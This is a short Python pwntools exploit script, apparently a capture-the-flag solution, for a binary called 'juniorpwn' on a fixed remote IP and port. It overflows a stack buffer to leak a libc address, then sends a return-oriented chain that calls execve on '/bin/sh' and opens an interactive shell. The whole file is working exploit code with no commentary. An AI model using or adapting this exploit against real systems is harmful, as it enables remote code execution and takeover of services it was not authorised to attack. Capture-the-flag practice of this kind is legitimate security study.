#!/usr/bin/env python3


from pwn import * 

e = ELF("./juniorpwn")
libc  = ELF("./libc.so.6")
#r = process("./juniorpwn")
r = remote("52.59.124.14",10034)
exploit = b"A" * 520 + p8(0xc3)
r.send(exploit)
r.recvuntil(b"A" * 520)
leak = u64(r.recvuntil(b"\x7f").decode('latin-1').ljust(8,'\x00')) - 0x271c3
print(hex(leak))
exploit = b"A" * 520 + p64(leak + 0x0000000000027765) + p64(leak + next(libc.search(b"/bin/sh\x00"))) + p64(leak + 0x28f19) + p64(0) + p64(leak + 0xfdcdd) + p64(0) + p64(leak + libc.sym.execve)
r.send(exploit)
r.interactive()

